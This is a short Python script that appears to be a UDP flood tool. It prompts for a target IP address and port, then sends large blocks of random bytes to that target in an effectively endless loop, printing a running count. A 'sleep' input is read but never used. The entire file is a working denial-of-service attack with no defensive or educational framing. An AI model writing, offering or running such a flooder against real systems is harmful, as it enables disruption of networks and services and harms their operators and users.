import socket, random

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("enter turip ip, ip, ip: ")
port = int(input("enter port port port: "))
sleep = int(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')